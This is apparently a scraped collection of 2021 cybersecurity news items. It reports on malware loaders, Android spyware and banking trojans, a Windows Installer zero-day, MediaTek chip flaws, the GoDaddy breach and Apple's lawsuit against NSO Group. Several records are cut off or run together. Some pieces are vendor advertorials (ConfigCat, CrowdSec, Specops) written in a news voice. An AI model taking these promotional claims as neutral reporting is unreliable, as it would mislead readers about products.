perform without Feature Flags.\nWhile many tech giants use in-house solutions, small and medium companies can’t afford such a luxury, because this would suck up more resources and time than it would be feasibly practical for them to invest in. \nConfigCat fills in this gap, presenting itself as a complete feature flag as a service solution. They stand distinctly from other feature management solutions due to their no-compromise approach to security (which many other companies in this field have it locked under either a paywall or a premium tier option of some sort). \nZoltán Dávid, one of the company’s founders, even firmly touted on multiple occasions that “security should never cost extra money.“ Here’s hoping that we see more of this mindset from other companies in 2021 and onwards as well. \nThe fairness approach\nLet’s get one thing straight. There are many other players out there that offer Feature Flag solutions, LaunchDarkly being one of them. As it stands, ConfigCat seems to firmly be placing itself as a solid LaunchDarkly alternative, more than anything else. A more “lightweight LaunchDarkly“ variant that wants to shine as an immensely more cost-effective, but which provides “90% of the power with only 10% of the complexity“ kind of deal. \nPricing\nPricing is yet another area where ConfigCat stands out. While many companies seem to do their best to lock you into their most pricey subscription tiers, ConfigCat almost insists that you don’t pay a nickel more than you need to. \n\nLike most feature flag as a service platform out there, they operate through monthly subscriptions. The one thing that you should keep an eye on is the number of monthly config.json downloads that your traffic generates, as this would determine which subscription would best fit your needs. Objectively speaking, this is a nice approach that allows you to foresee and transparently calculate costs beforehand, based on your actual traffic, and without any annoying paywalls forcing your hand. \nForever Free Plan\nThat being said, they hardly restrict you with anything else in most other subscription tiers. Even with their cheapest subscription plan (which you can check out here), you get a boatload of nice things like unlimited team member seats, unlimited monthly active users, uncrippled security, and many other goodies that you won’t see at most other competitors.\nTo top it all off, there’s even a very generous FOREVER FREE plan that fresh start-ups and beginners companies can use.\n\n\nFound this article interesting?

{'title': 'This New Stealthy JavaScript Loader Infecting Computers with Malware',
'text': 'Threat actors have been found using a previously undocumented JavaScript malware strain that functions as a loader to distribute an array of remote access Trojans (RATs) and information stealers.\nHP Threat Research dubbed the new, evasive loader “RATDispenser,“ with the malware responsible for deploying at least eight different malware families in 2021. Around 155 samples of this new malware have been discovered, spread across three different variants, hinting that it’s under active development.\n\n“RATDispenser is used to gain an initial foothold on a system before launching secondary malware that establishes control over the compromised device,“ security researcher Patrick Schläpfer said. “All the payloads were RATs, designed to steal information and give attackers control over victim devices.“\nAs with other attacks of this kind, the starting point of the infection is a phishing email containing a malicious attachment, which masquerades as a text file, but in reality is obfuscated JavaScript code programmed to write and execute a VBScript file, which, in turn, downloads the final-stage malware payload on the infected machine.\n\nRATDispenser has been observed dropping different kinds of malware, including STRRAT, WSHRAT (aka Houdini or Hworm), AdWind (aka AlienSpy or Sockrat), Formbook (aka xLoader), Remcos (aka Socmer), Panda Stealer, CloudEyE (aka GuLoader), and Ratty, each of which are equipped to siphon sensitive data from the compromised devices, in addition to targeting cryptocurrency wallets.\n\n“The variety in malware families, many of which can be purchased or downloaded freely from underground marketplaces, and the preference of malware operators to drop their payloads, suggest that the authors of RATDispenser may be operating under a malware-as-a-service business model,“ Schläpfer said.\n\n\nFound this article interesting?

'text': 'A new Iranian threat actor has been discovered exploiting a now-addressed critical flaw in the Microsoft Windows MSHTML platform to target Farsi-speaking victims with a previously undocumented PowerShell-based information stealer designed to harvest extensive details from infected machines.\n“[T]he stealer is a PowerShell script, short with powerful collection capabilities — in only ~150 lines, it provides the adversary a lot of critical information including screen captures, Telegram files, document collection, and extensive data about the victim’s environment,“ SafeBreach Labs researcher Tomer Bar said in a report published Wednesday.\n\nNearly half of the targets are from the U.S., with the cybersecurity firm noting that the attacks are likely aimed at “Iranians who live abroad and might be seen as a threat to Iran’s Islamic regime.“\nThe phishing campaign, which began in July 2021, involved the exploitation of CVE-2021-40444, a remote code execution flaw that could be exploited using specially crafted Microsoft Office documents. The vulnerability was patched by Microsoft in September 2021, weeks after reports of active exploitation emerged in the wild.\n\n“An attacker could craft a malicious ActiveX control to be used by a Microsoft Office document that hosts the browser rendering engine. The attacker would then have to convince the user to open the malicious document. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights,“ the Windows maker had noted.\nThe attack sequence described by SafeBreach begins with the targets receiving a spear-phishing email that comes with a Word document as an attachment. Opening the file triggers the exploit for CVE-2021-40444, resulting in the execution of a PowerShell script dubbed “PowerShortShell“ that’s capable of hoovering sensitive information and transmitting them to a command-and-control (C2) server.\n\nWhile infections involving the deployment of the info-stealer were observed on September 15, a day after Microsoft issued patches for the flaw, the aforementioned C2 server was also employed to harvest victims’ Gmail and Instagram credentials as part of two phishing campaigns staged by the same adversary in July 2021. \nThe development is the latest in a string of attacks that have capitalized on the MSTHML rendering engine flaw, with Microsoft previously disclosing a targeted phishing campaign that abused the vulnerability as part of an initial access campaign to distribute custom Cobalt Strike Beacon loaders.\n\n\nFound this article interesting?

{'title': 'Warning — Hackers Exploiting New Windows Installer Zero-Day Exploit in the Wild',
'text': 'Attackers are actively making efforts to exploit a new variant of a recently disclosed privilege escalation vulnerability to potentially execute arbitrary code on fully-patched systems, once again demonstrating how adversaries move quickly to weaponize a publicly available exploit.\nCisco Talos disclosed that it “detected malware samples in the wild that are attempting to take advantage of this vulnerability.“\nTracked as CVE-2021-41379 and discovered by security researcher Abdelhamid Naceri, the elevation of privilege flaw affecting the Windows Installer software component was originally resolved as part of Microsoft’s Patch Tuesday updates for November 2021.\n\nHowever, in what’s a case of an insufficient patch, Naceri found that it was not only possible to bypass the fix implemented by Microsoft but also achieve local privilege escalation via a newly discovered zero-day bug.\n\nThe proof-of-concept (PoC) exploit, dubbed “InstallerFileTakeOver,“ works by overwriting the discretionary access control list (DACL) for Microsoft Edge Elevation Service to replace any executable file on the system with an MSI installer file, allowing an attacker to run code with SYSTEM privileges.\nAn attacker with admin privileges could then abuse the access to gain full control over the compromised system, including the ability to download additional software, and modify, delete, or exfiltrate sensitive information stored in the machine.\n\n“Can confirm this works, local priv esc. Tested on Windows 10 20H2 and Windows 11. The prior patch MS issued didn’t fix the issue properly,“ tweeted security researcher Kevin Beaumont, corroborating the findings.\nNaceri noted that the latest variant of CVE-2021-41379 is “more powerful than the original one,“ and that the best course of action would be to wait for Microsoft to release a security patch for the problem “due to the complexity of this vulnerability.“\n“We are aware of the disclosure and will do what is necessary to keep our customers safe and protected,“ a Microsoft spokesperson told The Hacker News via email. “An attacker using the methods described must already have access and the ability to run code on a target victim’s machine.“\nUpdate: 0patch has issued a free micropatch to remediate the “InstallerFileTakeOver“ zero-day flaw in Windows Installer component that could be abused by a local unprivileged user to overwrite an existing system executable and then arbitrarily change its contents to gain SYSTEM permissions.\n“It doesn’t take a lot of imagination to see that taking over an executable file that is being used by a privileged process can get one’s code executed with such process’ privileges,“ 0patch’s Mitja Kolsek said in a write-up published Thursday.\n\n\nFound this article interesting?

{'title': 'Eavesdropping Bugs in MediaTek Chips Affect 37% of All Smartphones and IoT Globally',
'text': 'Multiple security weaknesses have been disclosed in MediaTek system-on-chips (SoCs) that could have enabled a threat actor to elevate privileges and execute arbitrary code in the firmware of the audio processor, effectively allowing the attackers to carry out a “massive eavesdrop campaign“ without the users’ knowledge.\nThe discovery of the flaws is the result of reverse-engineering the Taiwanese company’s audio digital signal processor (DSP) unit by Israeli cybersecurity firm Check Point Research, ultimately finding that by stringing them together with other flaws present in a smartphone manufacturer’s libraries, the issues uncovered in the chip could lead to local privilege escalation from an Android application. \n\n“A malformed inter-processor message could potentially be used by an attacker to execute and hide malicious code inside the DSP firmware,“ Check Point security researcher Slava Makkaveev said in a report. “Since the DSP firmware has access to the audio data flow, an attack on the DSP could potentially be used to eavesdrop on the user.“\nTracked as CVE-2021-0661, CVE-2021-0662, and CVE-2021-0663, the three security issues concern a heap-based buffer overflow in the audio DSP component that could be exploited to achieve elevated privileges. The flaws impact chipsets MT6779, MT6781, MT6785, MT6853, MT6853T, MT6873, MT6875, MT6877, MT6883, MT6885, MT6889, MT6891, MT6893, and MT8797 spanning across versions 9.0, 10.0, and 11.0 of Android.\n\n“In audio DSP, there is a possible out of bounds write due to an incorrect bounds check. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation,“ the chipmaker said in an advisory published last month.\nA fourth issue uncovered in the MediaTek audio hardware abstraction layer aka HAL (CVE-2021-0673) has been fixed as of October and is expected to be published in the December 2021 MediaTek Security Bulletin.\n\nIn a hypothetical attack scenario, a rogue app installed via social engineering means could leverage its access to Android’s AudioManager API to target a specialized library — named Android Aurisys HAL — that’s provisioned to communicate with the audio drivers on the device and send specially crafted messages, which could result in the execution of attack code and theft of audio-related information.\nMediaTek captured a record 43% of all smartphone SoC shipments for Q2 2021, with its processors used by several original equipment manufacturers such as Xiaomi, Oppo, Vivo, Sony, and Realme, meaning the vulnerabilities, if left unaddressed, could pose a huge attack surface for threat actors.\nMediaTek, following disclosure, said it has made appropriate mitigations available to all original equipment manufacturers, adding it found no evidence that the flaws are currently being exploited. Furthermore, the company has recommended users to update their devices as and when patches become available and to only install applications from trusted marketplaces such as the Google Play Store.\n\n\nFound this article interesting?

'text': 'A threat actor known for striking targets in the Middle East has evolved its Android spyware yet again with enhanced capabilities that allow it to be stealthier and more persistent while passing off as seemingly innocuous app updates to stay under the radar.\nThe new variants have “incorporated new features into their malicious apps that make them more resilient to actions by users, who might try to remove them manually, and to security and web hosting companies that attempt to block access to, or shut down, their command-and-control server domains,“ Sophos threat researcher Pankaj Kohli said in a report published Tuesday.\n\nAlso known by the monikers VAMP, FrozenCell, GnatSpy, and Desert Scorpion, the mobile spyware has been a preferred tool of choice for the APT-C-23 threat group since at least 2017, with successive iterations featuring extended surveillance functionality to vacuum files, images, contacts and call logs, read notifications from messaging apps, record calls (including WhatsApp), and dismiss notifications from built-in Android security apps.\n\nIn the past, the malware has been distributed via fake Android app stores under the guise of AndroidUpdate, Threema, and Telegram. The latest campaign is no different in that they take the form of apps that purport to install updates on the target’s phone with names such as App Updates, System Apps Updates, and Android Update Intelligence. It’s believed that the attackers deliver the spyware app by sending a download link to the targets through smishing messages.\n\nOnce installed, the app begins requesting for invasive permissions to perform a string of malicious activities that are designed to slip past any attempts to manually remove the malware. The app not only changes its icon to hide behind popular apps such as Chrome, Google, Google Play, and YouTube, in the event the user were to click the fraudulent icon, the legitimate version of the app is launched, while running surveillance tasks in the background.\n“Spyware is a growing threat in an increasingly connected world,“ Kohli said. “The Android spyware linked to APT-C-23 has been around for at least four years, and attackers continue to develop it with new techniques that evade detection and removal.“\n\n\nFound this article interesting?

Are You Prepared?“ helps you in that requirement definition process. It points out the dark side(s) of EDR and provides guidance as to how to overcome them according to your company’s unique environment. \nDownload the eBook hereRegister to the webinar here\nThe guide takes an in-depth look at these seven considerations during evaluation:\nWhat does “detect“ really mean. When at the end of day detection equals alerts, this guide shows how you can overcome the potentially overwhelming amount of alerts.How efficient is the detection. EDR has its share of blind spots. The authors point out these gaps and provide suggestions on how to close them according to your company’s risk appetite. What does “respond“ really mean. When response runs the gamut from manual guidance to automated remediation, you need to understand the terminology and decide on the level of automation that you require. What is the management overhead. Think of EDR as a process – from deployment, detection, and response to maintenance. You receive necessary tips as to how to reduce overhead across all process stages.What reporting is provided. Some EDR vendors have all the bells and whistles. Is that, though, right for your environment? Learn how to determine what are your reporting needs.What complementing technologies are still required. This section focuses on what else you might potentially need beyond the EDR tool– whether it’s closing detection and response, integration with security and IT systems, or even outsourcing services. Cost. The article rightfully points out that cost is not just about the direct cost of the product. It spells out how you can factor in how to stretch the dollar as well as to the intangible costs such as team burnout, maintenance, etc.\nAs opposed to most resources that present the value of EDR, this guide focuses on the practical aspects of an EDR evaluation, not just the glorification of the platform. This is a particularly useful approach to small security teams.

'text': 'At least 9.3 million Android devices have been infected by a new class of malware that disguises itself as dozens of arcade, shooter, and strategy games on Huawei’s AppGallery marketplace to steal device information and victims’ mobile phone numbers.\nThe mobile campaign was disclosed by researchers from Doctor Web, who classified the trojan as “Android.Cynos.7.origin,“ owing to the fact that the malware is a modified version of the Cynos malware. Of the total 190 rogue games identified, some were designed to target Russian-speaking users, while others were aimed at Chinese or international audiences.\n\nOnce installed, the apps prompted the victims for permission to make and manage phone calls, using the access to harvest their phone numbers along with other device information such as geolocation, mobile network parameters, and system metadata. \n\n“At first glance, a mobile phone number leak may seem like an insignificant problem. Yet in reality, it can seriously harm users, especially given the fact that children are the games’ main target audience,“ Doctor Web researchers said.\n\n“Even if the mobile phone number is registered to an adult, downloading a child’s game may highly likely indicate that the child is the one who actually using the mobile phone. It is very doubtful that parents would want the above data about the phone to be transferred not only to unknown foreign servers, but to anyone else in general.“\nWhile the malware-laced apps have since been purged from the app stores, users who have installed the apps on their devices will have to manually remove them to prevent further exploitation.\n\n\nFound this article interesting?

{'title': 'Apple Sues Israel’s NSO Group for Spying on iPhone Users With Pegasus Spyware',
'text': 'Apple has sued NSO Group and its parent company Q Cyber Technologies in a U.S. federal court holding it accountable for illegally targeting users with its Pegasus surveillance tool, marking yet another setback for the Israeli spyware vendor.\nThe Cupertino-based tech giant painted NSO Group as “notorious hackers — amoral 21st century mercenaries who have created highly sophisticated cyber-surveillance machinery that invites routine and flagrant abuse.“\nIn addition, the lawsuit seeks to permanently prevent the infamous hacker-for-hire company from breaking into any Apple software, services or devices. The iPhone maker, separately, also revealed its plans to notify targets of state-sponsored spyware attacks and has committed $10 million, as well as any monetary damages won as part of the lawsuit, to cybersurveillance research groups and advocates.\nTo that end, the company intends to display a “Threat Notification“ after the targeted users sign into appleid.apple[.]com, alongside sending an email and iMessage notification to the email addresses and phone numbers associated with the users’ Apple IDs.\n“State-sponsored actors like the NSO Group spend millions of dollars on sophisticated surveillance technologies without effective accountability. That needs to change,“ said Craig Federighi, Apple’s senior vice president of Software Engineering in a statement. “Apple devices are the most secure consumer hardware on the market — but private companies developing state-sponsored spyware have become even more dangerous.“\n\nTypically installed by leveraging “zero-click“ exploits that infect targeted devices without any user interaction, Pegasus is engineered as an invasive “military-grade“ spyware that’s capable of exfiltrating sensitive personal and geolocation information and stealthily activating the phones’ cameras and microphones.\nThe lawsuit filed by Apple specifically concerns the FORCEDENTRY exploit in iMessage that was used to circumvent iOS security protections and target nine Bahraini activists. The company said the attackers created over 100 bogus Apple IDs to send malicious data to the victims’ devices, effectively allowing NSO Group or its clients to deliver and install Pegasus spyware without their knowledge. Apple addressed the zero-day flaw in September.\n“The abusive data was sent to the target phone through Apple’s iMessage service, disabling logging on a targeted Apple device so that Defendants could surreptitiously deliver the Pegasus payload via a larger file,“ Apple detailed in its filing. “That larger file would be temporarily stored in an encrypted form unreadable to Apple on one of Apple’s iCloud servers in the United States or abroad for delivery to the target.“\nThe development comes in the aftermath of sweeping sanctions imposed by the U.S. government earlier this month against NSO Group for developing and supplying sophisticated surveillance technology to foreign governments that then used the spy tools to target journalists, activists, dissidents, academics, and government officials across the world. MIT Technology Review earlier this week reported that the sanctions have had a “deeper impact“ on the company’s morale and its future prospects.    \n“NSO Group is dismayed by the decision given that our technologies support U.S. national security interests and policies by preventing terrorism and crime, and thus we will advocate for this decision to be reversed,“ the company previously said following the announcement.\nDespite repeated claims that its software is sold only to governments and law enforcement agencies and that it has bulwarks in place to forestall abuse, multiple instances to the contrary have established a recurring pattern where the spyware has been misapplied by authoritarian regimes to strike the target and infect members of civil society, not to mention feature customers with poor human rights track records.\n\n“Thousands of lives were saved around the world thanks to NSO Group’s technologies used by its customers,“ a spokesperson for the company said in a statement shared with The Hacker News. “Pedophiles and terrorists can freely operate in technological safe-havens, and we provide governments the lawful tools to fight it. NSO group will continue to advocate for the truth.“\nThe lawsuit also mirrors a similar action taken by Meta (formerly Facebook) in October 2019, when it took the company to court for exploiting a bug in its WhatsApp messaging app to install Pegasus, enabling the surveillance of 1,400 mobile devices belonging to diplomats, journalists, and human rights activists. On November 8, 2021, the 9th U.S. Circuit Court of Appeals in San Francisco rejected NSO Group’s claim it was immune from being sued because it had acted as an agent of sovereign governments.\n“The steps Apple is taking today will send a clear message: in a free society, it is unacceptable to weaponize powerful state-sponsored spyware against innocent users and those who seek to make the world a better place,“ Ivan Krstic, Apple’s head of security engineering and architecture, said in a tweet.\n\n\nFound this article interesting?

{'title': 'What Avengers Movies Can Teach Us About Cybersecurity',
'text': 'Marvel has been entertaining us for the last 20 years. We have seen gods, super-soldiers, magicians, and other irradiated heroes fight baddies at galactic scales. The eternal fight of good versus evil. A little bit like in cybersecurity, goods guys fighting cybercriminals.If we choose to go with this fun analogy, is there anything useful we can learn from those movies?\nWorld-ending baddies always come with an army\nWhen we watch the different Avenger movies, the first thing we realize is that big baddies never fight alone. Think Ultron and his bot army, Thanos or Loki with the Chitauri. They all come with large, generic clone proxy armies that heroes must fight before getting to the final boss.\nIn the same way, serious cyberattacks are planned and delivered by organized and structured groups of cybercriminals such as APT groups with sometimes hundreds of members. In real-life scenarios, attacks are coming from IPs (one or many) that have been stolen, hacked, or bought by the criminals. IPs are their faceless proxy army and if you want to get to the attackers, you need first to burn that IP army down.\nSo how to do that? You can fight them alone and most probably fail, or you can team up with other superheroes as the Avengers do, and you might have a fighting-back chance. The keyword here is teaming up and leveraging collaboration or crowd intelligence.\nMore concretely, this means sharing information on attacks, for example. Most attacks leave traces in different systems, service or application logs that can give indications on the attacker’s IPs and attack types. Sharing those with other users can help remediation preventively if those IPs show up on other people’s logs. \nImagine this: Ultron’s minion IPs attack your server. Your IDS will detect their activity in your logs, and if you have an efficient IPS, you might block those IPs from doing further damage. But how about you share those Ultron IPs with your neighbor? Or all other people on Earth? How about all people on Earth will preventively block those IPs? Ultron’s army can not do any more harm. All it can do now is stop conquering Earth (or build a new army). But in any case, you won. All this is because of the power of the crowd.\nIron Man did not defeat Thanos alone\nLet’s get a closer look at the Avenger’s team roster. You all know their names and respective powers. But did you think about how complementary they are? Hulk is the tank, Thor the heavy hitter. Cap is the strategist, and he can deliver some close damage if needed. Iron Man is the range attack expert. Hawkeye is the never missing sniper. And Widow the perfect spy. They all bring different skills and powers to the table, making the team so efficient (and cool).\nBut back to cybersecurity. There are many tools out there that can help prevent attacks. Some might be efficient in specific situations, but there is no one ring to rule them all (ooops, wrong universe 😉). An EDR solution can protect your endpoints but will not be useful to counter a DDoS. A SIEM tool will help you centralize intelligence but will not help actively countering malicious activity. An IDS will detect funky stuff ongoing in the logs but will not act upon them.\nSo like the Avengers, you need a team of solutions that play well together and cover as many scenarios as possible. First, you need to detect and act. Choose an IDS and an IPS. Combine it with a CTI to get third-party data to enrich your threat database. Add some cybersecurity skills to operate efficiently. You get the most efficient combo to counter threats.\nIs it easy to put in motion? Well, it definitely requires work. Interfacing those tools, making sure the data is flowing efficiently between all those components can be challenging but, at the end, most rewarding.\nFrom the Avengers to real-life heroes\nCrowd intelligence and integrated solution. This was the idea behind the creation of CrowdSec.\nCybersecurity is an asymmetric game with attackers always having the initiative, making the problem hard to solve for most companies and people. You can throw money or technology at the problem, but nothing will guarantee its effectiveness.\n\nCrowdSec is proposing something new, something that has never been tried before at this scale. A collaborative IPS and IDS that uses crowd intelligence to block attacks. Collaboration between users to create a reputational and curated IP database to make sure users are protected in real-time against Ultrons and Thanoses of this world. Basically put, users contribute with signals - IP activity flagged as suspicious: it can be anything from brute force to credit card stuffing or scalping through DDoS - and regularly receive an updated blocklist of IPs that are to be “shot-at-sight“ if they show up in logs. Think, Waze of cybersecurity.\nAttackers hide behind IPs. If we, as a community, can burn those IPs, attackers will have no ammos left and will back down.\n\nIf you want to join the CrowdSec community, check out the official website. Oh, and it’s free and open-source!\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

SentinelLabs researcher Max Van Amerongen has been credited with discovering and reporting the issue, following which fixes have been rolled out by Oracle as part of its Critical Patch Update for July 2021.\n\nOracle VM VirtualBox is an open-source and cross-platform hypervisor and desktop virtualization software that enables users to run multiple guest operating systems such as Windows, Linux distributions, OpenBSD, and Oracle Solaris on a single physical machine.\n“Works as both an out-of-bounds read in the host process, as well as an integer underflow. In some instances, it can also be used to remotely DoS other Virtualbox virtual machines,“ Van Amerongen noted back in August.\nGot another Virtualbox vuln fixed (CVE-2021-2442)Works as both an OOB read in the host process, as well as an integer underflow.

{'title': 'More Stealthier Version of BrazKing Android Malware Spotted in the Wild',
'text': 'Banking apps from Brazil are being targeted by a more elusive and stealthier version of an Android remote access trojan (RAT) that’s capable of carrying out financial fraud attacks by stealing two-factor authentication (2FA) codes and initiating rogue transactions from infected devices to transfer money from victims’ accounts to an account operated by the threat actor.\nIBM X-Force dubbed the revamped banking malware BrazKing, a previous version of which was referred to as PixStealer by Check Point Research. The mobile RAT was first seen around November 2018, according to ThreatFabric.\n“It turns out that its developers have been working on making the malware more agile than before, moving its core overlay mechanism to pull fake overlay screens from the command-and-control (C2) server in real-time,“ IBM X-Force researcher Shahar Tavor noted in a technical deep dive published last week. “The malware […] allows the attacker to log keystrokes, extract the password, take over, initiate a transaction, and grab other transaction authorization details to complete it.“\n\nThe infection routine kicks off with a social engineering message that includes a link to an HTTPS website that warns prospective victims about security issues in their devices, while prompting an option to update the operating system to the latest version. However, for the attacks to succeed, users will have to explicitly enable a setting to install apps from unknown sources. \nBrazKing, like its predecessor, abuses accessibility permissions to perform overlay attacks on banking apps, but instead of retrieving a fake screen from a hardcoded URL and present it on top of the legitimate app, the process is now conducted on the server-side so that the list of targeted apps can be modified without making changes to the malware itself.\n\n“The detection of which app is being opened is now done server side, and the malware regularly sends on-screen content to the C2. Credential grabbing is then activated from the C2 server, and not by an automatic command from the malware,“ Tavor said.\nBanking trojans like BrazKing are particularly insidious in that after installation they require only a single action from the victim, i.e., enabling Android’s Accessibility Service, to fully unleash their malicious functionalities. Armed with the necessary permissions, the malware gathers intel from the infected machine, including reading SMS messages, capturing keystrokes, and accessing contact lists.\n“Accessibility Service is long known to be the Achilles’ heel of the Android operating system,“ ESET researcher Lukas Stefanko said last year. \n\nOn top of that, the malware also takes several steps to try to protect itself once it has been installed to avoid detection and removal. BrazKing is designed to monitor users when they are launching an antivirus solution or opening the app’s uninstall screen, and if so, swiftly return them to the home screen before any action can be taken.\n“Should the user attempt to restore the device to manufactory settings, BrazKing would quickly tap the ’Back’ and ’Home’ buttons faster than a human could, preventing them from removing the malware in that manner,“ Tavor explained.\nThe ultimate goal of the malware is to allow the adversary to interact with running apps on the device, keep tabs on the apps the users are viewing at any given point of time, record keystrokes entered in banking apps, and display fraudulent overlay screens to siphon the payment card’s PIN numbers and 2FA codes, and eventually perform unauthorized transactions.\n“Major desktop banking trojans have long abandoned the consumer banking realms for bigger bounties in BEC fraud, ransomware attacks and high-value individual heists,“ Tavor said. “This, together with the ongoing trend of online banking transitioning to mobile, caused a void in the underground cybercrime arena to be filled by mobile banking malware.“\n\n\nFound this article interesting?

{'title': 'The Importance of IT Security in Your Merger Acquisition',
'text': 'In the business world, mergers and acquisitions are commonplace as businesses combine, acquire, and enter various partnerships. Mergers and Acquisitions (M&A) are filled with often very complicated and complex processes to merge business processes, management, and a whole slew of other aspects of combining two businesses into a single logical entity.\nIn the modern business world before and after the acquisition, a new concern with M&A activities is cybersecurity. What role does cybersecurity play in today’s mergers and acquisitions of businesses? Why is it becoming a tremendous concern?\nCybersecurity threats are growing in leaps and bounds\nThere is no question that cybersecurity risks and threats are growing exponentially. A report from Cybersecurity Ventures estimated a ransomware attack on businesses would happen every 11 seconds in 2021. Global ransomware costs in 2021 would exceed $20 billion.\nIt seems there are constantly new reports of major ransomware attacks, costing victims millions of dollars. Earlier this year, the major ransomware attack on Colonial Pipeline resulted in disruptions that caused fuel shortages all over the East Coast of the United States. It helped to show that ransomware attacks on critical service companies can lead to real-world consequences and widespread disruption.\nThis world of extreme cybersecurity risks serves as the backdrop for business acquisitions and mergers. A Garner report estimated that 60% of organizations who were involved in M&A activities consider cybersecurity as a critical factor in the overall process. In addition, some 73% of businesses surveyed said that a technology acquisition was the top priority for their M&A activity, and 62% agreed there was a significant cybersecurity risk by acquiring new companies.\nRisks associated with Mergers & Acquisitions\nWhat risks are associated with mergers and acquisitions? There are several that include but are not limited to the following:\nIncreased regulatory scrutinyInherited cybersecurity risksCompromised accounts and passwordsLost or damaged customer confidenceData breaches in the acquired environment\nIncreased regulatory scrutiny\nCompliance regulations, like cybersecurity, are growing more complex and challenging for businesses. For example, regulators scrutinize business deals, including mergers and acquisitions, to help protect the growing emphasis on data sovereignty and data privacy.\nFrom a cybersecurity perspective, businesses that merge or acquire other organizations must make sure data compliance is a top priority to prevent fines for non-compliance.\nInherited cybersecurity risks\nCompanies must realize that even if they have a robust cybersecurity posture for their organization, the security dynamic can completely change with mergers and acquisitions. As a result, they inherit the cybersecurity challenges and issues of the acquired business. \nThe acquiring company inherits existing vulnerabilities, standards, risks, and cybersecurity liability as they assume control of the new business. \nCompromised accounts and passwords\nAs was the case with the Colonial Pipeline hack in May 2021, compromised account passwords are often the culprit behind major data breaches and ransomware attacks. As a result, businesses must understand securing acquired accounts and directory services immediately and implementing breached password protection is a priority.\nScanning the newly acquired environment for password vulnerabilities, reused passwords, breached passwords, and other password threats can help to quickly bolster the cybersecurity stance of the acquired user account assets. \nBusinesses that have combined due to a merger or acquisition may federate Active Directory accounts between them to access various resources. Password synchronization between on-premises and cloud directory services may also be in play. It further emphasizes the need to strengthen password security as accounts are granted access to additional business-critical resources. \nLost or damaged customer confidence\nBusinesses must take care of any merger or acquisition from a customer perspective. Any misstep, including handling cybersecurity during an acquisition or merger, can lead to customer mistrust and lost business. \nData breaches in the acquired environment\nAs mentioned earlier, the acquiring company that has merged or acquired another company inherits the cybersecurity challenges and risks of the newly acquired environment. These risks include any potential data breaches. Knowledge of a data breach event can even stall or block a potential merger or acquisition once known. Data breach events can also go undisclosed to prevent any issues with the merger or acquisition. \nCybersecurity and compliance checklist for M&A\n \nForm an M&A cybersecurity teamReview the target business cybersecurity postureInventory all physical, digital, and data assets of the target organizationRevisit the risk assessmentEngage a third-party security company1 — Form an M&A cybersecurity team\nBusinesses often have excellent reasons for engaging in M&A activity. However, as discussed thus far, it can lead to additional cybersecurity risks. Forming an M&A cybersecurity team is a great idea to accelerate addressing the cybersecurity tasks involved with the M&A. This team may report to the CIO and should undoubtedly include cybersecurity leaders found on the security teams and key business leaders within the organization.\nThis team will be directly responsible for formalizing the reporting structure for addressing the cybersecurity risks discovered with the M&A activity. The team will also help to align the overall business on both sides for a consistent cybersecurity posture. \n2 — Review the target business cybersecurity posture\nThe M&A cybersecurity team mentioned above will be instrumental in reviewing the target business cybersecurity posture. The review of the target organization’s cybersecurity landscape should include:\nA cybersecurity risk assessmentReview of security policies and proceduresRecent audit reportsAny breach reports that have happened recently or in years pastAudit of accounts and account access permissions across the organization3 — Inventory all physical, digital, and data assets of the target organization\nTo properly understand the cybersecurity risk involved with an M&A of another organization, businesses must understand the complete inventory of all physical, digital, and data assets. Understanding and having a comprehensive inventory of these items allow full disclosure of the cybersecurity risks involved. \n4 — Revisit the risk assessment\nAny M&A activity means an organization needs to revisit its risk assessment. Even a recent risk assessment has now changed due to the reasons we have already covered (inherited cybersecurity risk, any security or compliance challenges, etc.).\n5 — Engage a third-party security company\n \nThe M&A cybersecurity team may include a wide range of technical expertise with a wealth of experience in many cybersecurity disciplines. However, even with talented team members, organizations may opt to engage a third-party security company with the technical and staffing resources to help with cybersecurity discovery, remediation, combining security resources, and many other tasks.\nQuickly manage M&A password security during\nPassword and account security can be challenging to manage and secure during a merger or acquisition of multiple companies. Specops Password Policy provides organizations with tools to secure their native Active Directory infrastructure and any other directory services they may manage.\nOne of the blind spots with any merger or acquisition can be weak, reused, or even breached passwords lurking as a hidden cybersecurity threat. Specops Password Policy provides Breached Password Protection that provides continuous scanning and alerting of any breached accounts found in the environment.\nOrganizations can quickly remediate any lax password policies found in the target organization with Specops Password Policy. It provides the following features:\nMultiple custom dictionary listsBreached Password Protection, protecting against over 2 billion breached passwords. This protection includes passwords found on known breached lists as well as passwords being used in attacks happening right nowEasily find and remove compromised passwords in your environmentInformative end-user client messaging that is intuitive during password changesReal-time, dynamic feedback at password change with the Specops Authentication clientLength-based password expirationCustomizable email notificationsBlock user names, display names, specific words, consecutive characters, incremental passwords, and reusing a part of the current passwordGPO-driven targeting for any GPO level, computer, user, or group populationPassphrase supportOver 25 languages supportedUse Regular Expressions for further password filter customization\nSpecops Password Policy Breached password protection\nBy bolstering password security in target environments, businesses can protect mergers and acquisitions from one of the most common vulnerabilities leading to compromise.

'text': 'Web hosting giant GoDaddy on Monday disclosed a data breach that resulted in the unauthorized access of data belonging to a total of 1.2 million active and inactive customers, making it the third security incident to come to light since 2018.\nIn a filing with the U.S. Securities and Exchange Commission (SEC), the world’s largest domain registrar said that a malicious third-party managed to gain access to its Managed WordPress hosting environment on September 6 with the help of a compromised password, using it to obtain sensitive information pertaining to its customers. It’s not immediately clear if the compromised password was secured with two-factor authentication.\n\nThe Arizona-based company claims over 20 million customers, with more than 82 million domain names registered using its services.\n\nGoDaddy revealed it discovered the break-in on November 17. An investigation into the incident is ongoing and the company said it’s “contacting all impacted customers directly with specific details.“ The following information is believed to have been accessed by the intruder —\nEmail addresses and customer numbers of up to 1.2 million active and inactive Managed WordPress customersOriginal WordPress Admin password that was set at the time of provisioning was exposedsFTP and database usernames and passwords associated with its active customers, andSSL private keys for a subset of active customers\nGoDaddy said it’s in the process of issuing and installing new certificates for the impacted customers. As a precautionary measure, the company also stated it has reset the affected passwords and it’s bolstering its provisioning system with added security protections.\n\nAccording to Wordfence CEO Mark Maunder, “GoDaddy stored sFTP passwords in such a way that the plaintext versions of the passwords could be retrieved, rather than storing salted hashes of these passwords, or providing public key authentication, which are both industry best practices.“\nWhile data breaches are no longer a sporadic occurrence, the exposure of email addresses and passwords presents risk of phishing attacks, not to mention enable the attackers to breach the vulnerable WordPress sites to upload malware and access other personally identifiable information stored in them. \n“On sites where the SSL private key was exposed, it could be possible for an attacker to decrypt traffic using the stolen SSL private key, provided they could successfully perform a 